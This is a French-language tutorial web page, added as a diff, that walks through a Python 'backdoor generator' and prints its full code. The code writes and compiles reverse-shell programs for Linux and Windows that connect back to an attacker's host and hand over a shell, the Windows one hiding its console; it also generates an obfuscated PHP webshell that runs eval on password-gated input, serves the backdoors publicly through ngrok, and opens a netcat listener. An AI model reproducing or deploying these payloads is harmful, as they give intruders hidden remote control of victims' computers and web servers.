@@ -1,0 +1,690 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<html>
+<head>
+  <title>Hacker de dimanche notes</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="prism.css">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width">
+  <script src="prism.js"></script>
+</head>
+
+<body>
+<ul class="navbar">
+  <li><a href="index.html">Home page</a>
+  <li><a href="py-lang.html">Python </a>
+  <li><a href="c-lang.html">C# </a>
+  <li><a href="nim-lang.html">Nim </a>
+  <li><a href="others-lang.html">Autres</a></li>
+  <li><a href="contact-me.html">Contact</a></li>
+  <li><a href="sitemap.html">Plan du site</a></li>
+</ul>
+<div class="banner">
+<p>Hacker de dimanche notes</p>
+</div>
+<div class="divfoo">
+<h1>PYTHON</h1>
+<div class="pitac">
+<img class="pyimg"src="https://www.python.org/static/community_logos/python-logo.png"/>
+<h1>Générateur de porte derobée </h1>
+<p>mon premier programme python était sans doute hello world 😀<br><br>
+Je vais pas vous présenter ici le code source d'un programme python Hello World une petite recherche sur le web pourra vous être utile...<br><br>
+À ce stade je suppose que vous êtes en mesures d'écrire du code python et que python est déja installé sur votre machine avec la  version la plus récente .<br><br>
+j'ai beaucoup aimé ce langage à cause de sa simplicité et je me suis mis au boulot en codant des petits programmes et tester d'autres aprés les avoir modifiés une fois trouvé le code source sur la trésorerie de github <br>
+c'est le cas pour ce script python pou générer un backdoor Linux et Windows et aussi un shell PHP <br></p>
+<p class="penbat">Commençons les choses sérieuses</p>
+<hr >
+ <p><h1>Importer les modules depuis la bibliothèque python</h1>
+Le programme à besoin des bibliothèques Python pour fonctionner, sachons que certains d'entre eux sont importés et non utilisés afin de réaliser des tests que j'ai pas terminé a l'heure actuelle<br><br>
+</p>
+<pre data-start="0" ><code class="language-python line-numbers">
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import string, base64
+from Crypto.Cipher import AES
+from subprocess import check_output
+from time import sleep
+import time
+import os
+import sys
+import http.server
+import socket
+import re
+import random
+from time import gmtime, strftime
+import threading
+import py_compile
+threadsClients = []
+#s=strftime("%Y-%m-%d %H:%M")
+#print("DATE : ", s)
+</code></pre>
+<p><h1>Organniser les couleurs </h1>
+Nous pouvons mettre de la couleur dans notre programme pour lui donné un design et mieux organiser son code<br>
+pour plus de couleurs jeter un œil <a href="https://misc.flogisoft.com/bash/tip_colors_and_formatting#terminals_compatibility" target="_blank">ici </a><br>
+
+</p>
+
+<pre data-start="20" ><code class="language-python line-numbers">
+''' Colors '''
+MAIN = '\001\033[38;5;85m\002'
+GREEN = '\001\033[38;5;82m\002'
+GRAY = PLOAD = '\001\033[38;5;246m\002'
+NAME = '\001\033[38;5;228m\002'
+RED = '\001\033[1;31m\002'
+FAIL = '\001\033[1;91m\002'
+ORANGE = '\033[0;38;5;214m\002'
+LRED = '\033[0;38;5;202m\002'
+BOLD = '\001\033[1m\002'
+</code></pre>
+<p><h1>Ecrire une license ou une Copyright </h1>
+Le contrat de licence d’utilisation de logiciel permet de définir les conditions dans lesquelles le programme peut être utilisé
+</p>
+<pre data-start="20" ><code class="language-python line-numbers">
+licence=(NAME+"""Copyright © DKWebpoint
+En aucun cas, les auteurs ou les titulaires de droits d'auteur ne
+pourront être tenus responsables de toute réclamation, dommage ou
+autre responsabilité, que ce soit dans le cadre d'une action
+contractuelle,délictuelle ou autre
+Le logiciel peut être librement utilisé, reproduit, modifié, distribué ou vendu sur le dark net (°__°)
+Le programme est sous la licence Apache 2.0 et la licence publique générale (GPL, General Public License) GNU version 3 
+En gros faites ce que vous voulez avec ,je ne suis pas responsable des conneries des autres (°___°)
+\033[1;36m----------------------------------------------------------
+\033[91m""")
+</code></pre>
+<p><h1>Afficher La bannière et le menu de notre programme</h1>
+La ligne numéro 66 
+<pre data-start="65" ><code class="language-python line-numbers">
+options = input("DKWeb~# \033[1;39mSelect Option : \033[1;39m")<br>
+</code></pre>
+nous donne accés au menu pour choisir les options que l'on puisse selectionner<br>
+<pre data-start="30" ><code class="language-python line-numbers">
+def banner():
+   print(licence + """
+          [!] ~ Outils de hacking par DKWebpoint ~ [!]
+                https://dkwebpoint.github.io/Dk/
+
+\033[1;33m DKWEB \033[1;36m Hacker de dimanche
+\033[1;33m Version \33[1;36m 2.0.1  2021
+\033[1;33m Description : \033[1;36m Générateur de shell php et porte dérobée  Linux |  Windows 
+
+\033[1;68m -------------------------------------------------------
+    ,---,          ,-.          .---.    ,---,.    ,---,.
+  .'  .' `\    ,--/ /|         /. ./|  ,'  .' |  ,'  .'  \
+,---.'     \ ,--. :/ |     .--'.  ' ;,---.'   |,---.' .' |
+|   |  .`\  |:  : ' /     /__./ \ : ||   |   .'|   |  |: |
+:   : |  '  ||  '  /  .--'.  '   \' .:   :  |-,:   :  :  /
+|   ' '  ;  :'  |  : /___/ \ |    ' ':   |  ;/|:   |    ;
+'   | ;  .  ||  |   \;   \  \;      :|   :   .'|   :     \
+|   | :  |  ''  : |. \\   ;  `      ||   |  |-,|   |   . |
+'   : | /  ; |  | ' \ \.   \    .\  ;'   :  ;/|'   :  '; |
+|   | '` ,/  '  : |--'  \   \   ' \ ||   |    \|   |  | ;
+;   :  .'    ;  |,'      :   '  |--" |   :   .'|   :   /
+|   ,.'      '--'         \   \ ;    |   | ,'  |   | ,'
+'---'                      '---"     `----'    `----'
+\033[1;68m -------------------------------------------------------
+
+""")
+
+def main():
+    print ("""
+    [\033[1;36m  [\033[1;39m1\033[1;36m] Linux
+    [\033[1;39m2\033[1;36m] Windows
+    [\033[1;39m3\033[1;36m] CreateShellPhp
+    [\033[1;39m4\033[1;36m] Listening_Connection
+    [\033[1;39m5\033[1;36m] Exit
+""")
+    options = input("DKWeb~# \033[1;39mSelect Option : \033[1;39m")
+    if(options == '5'):
+        print("\n\033[1;36mFinishing up  ...\n")
+        sys.exit()
+    else :
+        banner()
+</code></pre>
+<p><h1>Exécutons le code</h1>
+Le programme s'exécute à partir de la ligne numéro 72 en affichant la bannière et les options à choisir:
+<ul>
+<li>1 générer un backdoor linux</li>
+<li>2 générer un backdoor windows</li>
+<li>3 générer un shell PHP </li>
+<li>4 écouter la connexion entrante sur le port ouvert de notre backdoor crée auparavant</li>
+<li>5 quitter le programme</li>
+</ul>
+<pre data-start="71" ><code class="language-python line-numbers">
+if __name__ == '__main__':
+ try:
+  banner()
+  main()
+ except KeyboardInterrupt:
+        print(" Finishing up...Keyboard Interrup\r"),
+        time.sleep(0.25)
+</code></pre>
+Voici à quoi ressemble l'interface de notre programme une fois le code exécuté<br>
+<img class="dkimg"src="https://raw.githubusercontent.com/Dkwebpoint/Dk/ecebe0d34f753fac63ad788fb0a28f940d93c124/IMG_20240111_174255.jpg"/><br><br>
+<p><h1>Les options</h1>
+<h3>Option 5 : Quitter le programme</h3>
+
+L'option numéro 5  est déjà défini à la ligne 67 pour quitter le programme<br>
+Si cette option est choisi le programme vas donc se terminé sans erreurs.<br><br>
+Voici le code pour le reste des options numéro 1,2,3 et 4 <br>
+il suffit de le placer juste aprés la ligne numéro 66:
+<pre data-start="65" ><code class="language-python line-numbers">
+options = input("DKWeb~# \033[1;39mSelect Option : \033[1;39m")<br>
+</code></pre>
+<h3>Option 1: Générer un backdoor linux et le mettre en téléchar gement </h3>
+ Pour mettre en téléchargement le backdoor sur votre serveur web
+ et si ngrok est installé sur votre machine
+ décommenter les lignes : 86 à 97
+</p>
+<pre data-start="71" ><code class="language-python line-numbers">
+#linux
+    if(options == '1'):
+
+        host = input("\n\033[1;36mIP: \033[1;39m" )
+        port = input("\n\033[1;36mPORT: \033[1;39m" )
+        linux_shell(host, port)
+        os.system("gcc .linux.c -o dkwebTeam-BackdoorLinux -pthread")
+        os.system("chmod +x dkwebTeam-BackdoorLinux")
+        print("\n\033[1;36mFile Saved > \033[1;39mdkwebTeam-BackdoorLinux")
+        #########################http.server 80 ###########################
+        # Pour mettre en téléchargement le backdoor sur votre serveur web
+        # si ngrok est installé sur votre machine
+        # décommenter (supprimer le '#') les lignes : 86 à 97
+        ##################################################################
+        #os.system("python3 -m http.server 80 > .server 2> /dev/null &")
+        #os.system("chmod +x ngrok")
+        #name1="/dkwebTeam-BackdoorLinux"
+        #portN=80
+        #os.system("./ngrok http {} > /dev/null &".format(portN))
+        #sleep(8)                                                                        
+        #os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
+        #urlFile = open('link2.url', 'r')
+        #url = urlFile.read()
+        #urlFile.close()
+        #if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+        #  print("\n\033[1;36mLINK : \033[1;39m",url+name1)
+        print(" ")
+</code></pre>
+<h3>Option 2: générer un backdoor windows et le mettre en téléchargement</h3>
+Pour mettre en téléchargement le backdoor sur votre serveur web 
+et si ngrok est installé sur votre machine 
+décommenter les lignes : 113 à 125
+<pre data-start="99" ><code class="language-python line-numbers">
+#windows
+    if(options == '2'):
+        host = input( "\n\033[1;36mIP: \033[1;39m" )
+        port = input("\n\033[1;36mPORT: \033[1;39m" )
+        windows_reverse(host, port)
+        os.system("gcc .windows.c -o dkwebTeam-BackdoorWin.exe -ws2_32 && rm -rf .windows.c""")
+        print("\n\033[1;36mFile Saved > \033[1;39mdkwebTeam-BackdoorWin")
+        #http.server 80
+        #########################http.server 80 ###########################
+        # Pour mettre en téléchargement le backdoor sur votre serveur web
+        # si ngrok est installé sur votre machine
+        # décommenter (supprimer le '#') les lignes : 113 à 125
+        ##################################################################
+        #os.system("python3 -m http.server 80 > .server 2> /dev/null &")
+        #os.system("chmod +x ngrok")
+        #name2="/dkwebTeam-BackdoorWin.exe"
+        #portN=80
+        #os.system("./ngrok http {} > /dev/null &".format(portN))
+        #sleep(8)
+        #os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
+        #urlFile = open('link2.url', 'r')
+        #url = urlFile.read()
+        #urlFile.close()
+        #if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+        #  print("\n\033[r1;36mLINK : \033[1;39m",url+name2)
+        print(" ")
+</code></pre>
+<h3>Option 3: générer un shell PHP </h3>
+Si cette option est choisi un fichier PHP «.shell.php» vas être imprimé et enregistré dans le répertoire de travail 
+c'est votre shell php 
+<pre data-start="125" ><code class="language-python line-numbers">
+#shell php
+if(options == '3'):
+        print("\n\033[1;36mFile Saved >\033[1;39m.shell.php")
+        print(" ")
+        with open(".shell.php", "w") as file:
+            file.write(build_webshell())
+        print(f"{ORANGE}#################### This is your shell code :####################{END}")
+        print(f"{ORANGE}This is your shell {END} ")
+        print(f"{GRAY}copie and paste in a web server{END")
+        print(f"{GREEN}#github: https://github.com/pureqh/webshell{END}")
+        print(f"{LRED}#use:GET:http://url?pass=pureqh POST:zero{END}")
+        print (f"{GRAY}{build_webshell()}{END}")
+        print(f"{ORANGE}----------------------------------------------------------{END}")
+</code></pre>
+<h3>Option 4: Ecouter la connexion entrante à l'aide de NC</h3>
+écouter la connexion entrante sur le port ouvert de notre backdoor crée auparavant
+<pre data-start="138" ><code class="language-python line-numbers">
+if(options == '4'):
+        port=input("\n\033[1;36mPORT: \033[1;39m")
+        print("\n\033[1;36mWait Connection ...\n")
+        os.system("nc -l %s" %port)
+        print("\033[1;36m")
+</code></pre>
+<h1>Les fonctions</h1>
+maintenant nous devons définir les fonctions qui vont nous permettre de réaliser les options décrites ci-dessus 
+<h3>linux_shell </h3>
+<pre data-start="143" ><code class="language-python line-numbers">
+def linux_shell(host, port):
+       with open(".linux.c", "w") as file:
+           file.write('''
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int main (int argc, char **argv)
+{
+  int scktd;
+  struct sockaddr_in client;
+
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("%s");
+  client.sin_port = htons(%s);
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+  execl("/bin/sh","sh","-i",NULL,NULL);
+  return 0;
+}
+''' % (host, port))
+</code></pre>
+<h3>windows_reverse</h3>
+<pre data-start="168" ><code class="language-python line-numbers">
+def windows_reverse(host, port):
+    with open(".windows.c", "w") as file:
+        file.write('''
+#include <winsock2.h>
+#include <stdio.h>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma comment(lib,"ws2_32")
+  WSADATA wsaData;
+  SOCKET Winsock;
+  SOCKET Sock;
+  struct sockaddr_in hax;
+  char ip_addr[16];
+  STARTUPINFO ini_processo;
+  PROCESS_INFORMATION processo_info;
+//int main(int argc, char *argv[])
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
+{
+    FreeConsole();
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
+    struct hostent *host;
+    host = gethostbyname("'''+host+'''");
+    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi("'''+port+'''"));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
+    memset(&ini_processo,0,sizeof(ini_processo));
+    ini_processo.cb=sizeof(ini_processo);
+    ini_processo.dwFlags=STARTF_USESTDHANDLES;
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
+}
+''')
+</code></pre>
+<h3>build_webshell</h3>
+<pre data-start="202" ><code class="language-python line-numbers">
+def random_keys(len):
+    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    return ''.join(random.sample(str,len))
+
+def random_name(len):
+    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    return ''.join(random.sample(str,len))
+
+def build_webshell():
+    className = random_name(4)                                                                           lef = ('''{''')
+    parameter1 = random_name(4)
+    parameter2 = random_name(4)
+    rig = ('''}''')
+    disrupt = ("\"/*")+random_keys(7)+("*/\"")
+    fun1 = random_name(4)
+    fun1_vul = random_name(4)
+    fun1_ret = random_name(4)
+    fun2 = random_name(4)
+    shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun>
+    return shellc
+</code></pre>
+<h3>Shell variable</h3>
+<pre data-start="222" ><code class="language-python line-numbers">
+shell = ('''<?php
+class {0}{1}
+        public ${2} = null;
+        public ${3} = null;
+        function __construct(){1}
+            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}
+        $this->{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
+        $this->{3} = @{9}($this->{2});
+        @eval({5}.$this->{3}.{5});
+        {4}{4}{4}
+new {0}();
+function {6}(${7}){1}
+    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
+    ${8} = '';
+    $v = 0;
+    $vbits = 0;
+    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
+    $v <<= 8;
+        $v += ord(${7}[$i]);
+        $vbits += 8;
+        while ($vbits >= 5) {1}
+            $vbits -= 5;
+            ${8} .= $BASE32_ALPHABET[$v >> $vbits];
+            $v &= ((1 << $vbits) - 1);{4}{4}
+    if ($vbits > 0){1}
+        $v <<= (5 - $vbits);
+        ${8} .= $BASE32_ALPHABET[$v];{4}
+    return ${8};{4}
+function {9}(${7}){1}
+    ${8} = '';
+    $v = 0;
+    $vbits = 0;                                                                                          for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
+        $v <<= 5;
+        if (${7}[$i] >= 'a' && ${7}[$i] <= 'z'){1}
+            $v += (ord(${7}[$i]) - 97);
+           {4} elseif (${7}[$i] >= '2' && ${7}[$i] <= '7') {1}
+            $v += (24 + ${7}[$i]);
+        {4} else {1}
+            exit(1);
+        {4}                                                                                                  $vbits += 5;
+        while ($vbits >= 8){1}
+            $vbits -= 8;
+            ${8} .= chr($v >> $vbits);
+            $v &= ((1 << $vbits) - 1);{4}{4}
+    return ${8};{4}
+?>''')
+</code></pre>
+<h1>Le code finale</h1>
+<pre data-start="" ><code class="language-python line-numbers">
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import string, base64
+from Crypto.Cipher import AES
+from time import sleep
+import time
+import os 
+import sys
+import http.server
+import socket
+import re
+import random
+from time import gmtime, strftime
+import threading
+import py_compile
+threadsClients = []
+#s=strftime("%Y-%m-%d %H:%M")
+#print("DATE : ", s)
+''' Colors '''
+MAIN = '\001\033[38;5;85m\002'
+GREEN = '\001\033[38;5;82m\002'
+GRAY = PLOAD = '\001\033[38;5;246m\002'
+NAME = '\001\033[38;5;228m\002'
+RED = '\001\033[1;31m\002'
+FAIL = '\001\033[1;91m\002'
+ORANGE = '\033[0;38;5;214m\002'
+LRED = '\033[0;38;5;202m\002'
+BOLD = '\001\033[1m\002'
+UNDERLINE = '\001\033[4m\002'
+END = '\001\033[0m\002'
+
+licence=(NAME+"""Copyright © DKWebpoint
+En aucun cas, les auteurs ou les titulaires de droits d'auteur ne
+pourront être tenus responsables de toute réclamation, dommage ou 
+autre responsabilité, que ce soit dans le cadre d'une action 
+contractuelle,délictuelle ou autre, découlant de, hors ou en 
+relation avec le logiciel ou l'utilisation ou d'autres transactions
+dans le Logiciel.
+\033[1;36m----------------------------------------------------------
+\033[91m""")
+def main():
+    print(licence + """
+          [!] ~ Outils de piratage par DKWeb ~ [!]
+                http://dkweb.fr
+
+\033[1;33m DKWEB \033[1;36m SECURITY TEAM
+\033[1;33m Version \33[1;36m 2.0.1  2021
+\033[1;33m Description : \033[1;36m Générateur de porte dérobée | Linux et Windows
+
+  +-------------------------------------------------------+
+  |    Générateur de porte dérobée | Linux et Windows     |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""|======[*** |            |
+  |             )=\           | |  EXPLOIT    \           |
+  |            // \\           | |_____________\_______    |
+  |           //   \\          | |==[dkweb>]===========\   |
+  |          //     \\         | |______________________\  |
+  |         // RECON \\        | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\       |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/          |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)d****|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+""")
+
+def banner():
+    print ("""
+  \033[1;36m  [\033[1;39m1\033[1;36m] Linux
+    [\033[1;39m2\033[1;36m] Windows
+    [\033[1;39m3\033[1;36m] CreateShellPhp
+    [\033[1;39m4\033[1;36m] Listening_Connection
+    [\033[1;39m5\033[1;36m] Exit
+""")
+
+    options = input("DKWeb~# \033[1;39mSelect Option : \033[1;39m")
+    if(options == '1'):
+
+        host = input("\n\033[1;36mIP: \033[1;39m" )
+        port = input("\n\033[1;36mPORT: \033[1;39m" )
+        linux_shell(host, port)
+        os.system("gcc .linux.c -o dkwebTeam-BackdoorLinux -pthread && rm -rf .linux.c")
+        os.system("chmod +x dkwebTeam-BackdoorLinux")
+        print("\n\033[1;36mFile Saved > \033[1;39mdkwebTeam-BackdoorLinux")
+        #http.server 80
+        os.system("python3 -m http.server 80 > .server 2> /dev/null &")
+        os.system("chmod +x ngrok")
+        name1="/dkwebTeam-BackdoorLinux"
+        portN=80
+        os.system("./ngrok http {} > /dev/null &".format(portN))
+        sleep(8)
+        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
+        urlFile = open('link2.url', 'r')
+        url = urlFile.read()
+        urlFile.close()
+        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+          print("\n\033[1;36mLINK : \033[1;39m",url+name1)
+
+        print(" ")
+
+#windows
+    if(options == '2'):
+        host = input( "\n\033[1;36mIP: \033[1;39m" )
+        port = input("\n\033[1;36mPORT: \033[1;39m" )
+        windows_reverse(host, port)
+        os.system("gcc .windows.c -o dkwebTeam-BackdoorWin.exe -ws2_32 && rm -rf .windows.c""")
+        print("\n\033[1;36mFile Saved > \033[1;39mdkwebTeam-BackdoorWin.exe")
+        #http.server 80
+        os.system("python3 -m http.server 80 > .server 2> /dev/null &")
+        os.system("chmod +x ngrok")
+        name2="/dkwebTeam-BackdoorWin.exe"
+        portN=80
+        os.system("./ngrok http {} > /dev/null &".format(portN))
+        sleep(8)
+        os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
+        urlFile = open('link2.url', 'r')
+        url = urlFile.read()
+        urlFile.close()
+        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+          print("\n\033[r1;36mLINK : \033[1;39m",url+name2)
+        print(" ")
+
+#shellPhp
+
+    if(options == '3'):
+        print("\n\033[1;36mFile Saved >\033[1;39m.shell.php")
+        print(" ")
+        with open(".shell.php", "w") as file:
+            file.write(build_webshell())
+        print(f"{ORANGE}#################### This is your shell code :####################{END}")
+        print(f"{ORANGE}This is your shell {END} ")
+        print(f'{GRAY}copie and paste in a web server{END}')
+        print (f"{GRAY}{build_webshell()}{END}")
+        print(f"{ORANGE}----------------------------------------------------------{END}")
+    if(options == '4'):
+        port=input("\n\033[1;36mPORT: \033[1;39m")
+        print("\n\033[1;36mWait Connection ...\n")
+        os.system("nc -l %s" %port)
+        print("\033[1;36m")
+
+    if(options == '5'):
+        print("\n\033[1;36mFinishing up ...\n")
+        sys.exit()
+        os.system("fuser -k -n tcp 80") # kill port 80   
+    else :
+
+        banner()
+
+def linux_shell(host, port):
+       with open(".linux.c", "w") as file:
+           file.write('''
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+ 
+int main (int argc, char **argv)
+{
+  int scktd;
+  struct sockaddr_in client;
+ 
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("%s");
+  client.sin_port = htons(%s);
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+  execl("/bin/sh","sh","-i",NULL,NULL);
+  return 0;
+}
+''' % (host, port))
+ 
+def windows_reverse(host, port):
+    with open(".windows.c", "w") as file:
+        file.write('''
+#include <winsock2.h>
+#include <stdio.h>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma comment(lib,"ws2_32")
+  WSADATA wsaData;
+  SOCKET Winsock;
+  SOCKET Sock;
+  struct sockaddr_in hax;
+  char ip_addr[16];
+  STARTUPINFO ini_processo;
+  PROCESS_INFORMATION processo_info;
+//int main(int argc, char *argv[])
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
+{
+    FreeConsole();
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
+    struct hostent *host;
+    host = gethostbyname("'''+host+'''");
+    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi("'''+port+'''"));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
+    memset(&ini_processo,0,sizeof(ini_processo));
+    ini_processo.cb=sizeof(ini_processo);
+    ini_processo.dwFlags=STARTF_USESTDHANDLES;
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
+}
+''')
+def random_keys(len):
+    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    return ''.join(random.sample(str,len))
+
+def random_name(len):
+    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    return ''.join(random.sample(str,len))
+
+def build_webshell():
+    className = random_name(4)
+    lef = ('''{''')
+    parameter1 = random_name(4)
+    parameter2 = random_name(4)
+    rig = ('''}''')
+    disrupt = ("\"/*")+random_keys(7)+("*/\"")
+    fun1 = random_name(4)
+    fun1_vul = random_name(4)
+    fun1_ret = random_name(4)
+    fun2 = random_name(4)
+    shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2)
+    return shellc
+
+''' Encryption '''
+def encrypt_msg(aes_key, msg, iv):
+	enc_s = AES.new(aes_key, AES.MODE_CFB, iv)
+	if type(msg) == bytes:
+		cipher_text = enc_s.encrypt(msg)
+	else:
+		cipher_text = enc_s.encrypt(msg.encode('utf-8'))
+	encoded_cipher_text = base64.b64encode(cipher_text)
+	return encoded_cipher_text
+
+
+
+def decrypt_msg(aes_key, cipher, iv):
+	try:
+		decryption_suite = AES.new(aes_key, AES.MODE_CFB, iv)
+		plain_text = decryption_suite.decrypt(base64.b64decode(cipher + b'=='))
+		return plain_text if type(plain_text) == str else plain_text.decode('utf-8', 'ignore')
+	except TypeError:
+		pass
+
+
+if __name__ == '__main__':
+    try:
+        main()
+        banner()
+    except KeyboardInterrupt:
+        print(" Finishing up...Keyboard Interrup\r"),
+        time.sleep(0.25)
+
+
+</code></pre>
+<h1>Résultat final</h1>
+<img class="dkimg" src="https://raw.githubusercontent.com/Dkwebpoint/Dk/main/IMG_20240522_090418.jpg"/></br>
+bon hacking...
+<p><a href="py-lang.html"><button class="prebtn">Précédent</button></a><a href="python-generateur-porte-derobee.html"><button class=" nextbtn">Suivant </button></a></p>
+<br><br>
+</div>
+</div>
+<div class="address"><p>© Copyright 2023<br>
+Hacker de dimanche notes<br>
+Coded by <a href="https://dkwebpoint.github.io/Dk/"> dkwebpoint </a><br>
+Hosted by github.io
+</p>
+</div>
+</body>
+</html>
